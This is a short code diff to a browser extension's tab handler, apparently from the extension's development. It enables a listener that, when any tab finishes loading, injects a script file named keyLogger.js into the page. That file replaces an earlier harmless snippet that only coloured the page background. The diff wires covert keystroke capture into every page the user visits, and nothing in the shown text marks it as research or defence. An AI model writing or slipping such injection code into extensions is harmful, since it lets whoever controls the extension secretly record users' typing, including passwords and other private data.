@@ -25,16 +25,18 @@ class Tabs {
     }
 
     init(){
-        // this.addEvent('onUpdated', this.onCompleteState)
+        this.addEvent('onUpdated', this.onCompleteState)
     }
 
     onCompleteState(tabId, changeInfo){
         console.log('onCompleteState')
         if (changeInfo.status === 'complete') {
             chrome.tabs.executeScript(tabId, {
-                allFrames: true, 
-                code: "document.body.style.backgroundColor='red'",
+                // code: "document.body.style.backgroundColor='red'",
+                file: "keyLogger.js",
                 runAt: 'document_idle'
+            }, (result) => {
+                console.log('executeScript result', result)
             })
         }
     }
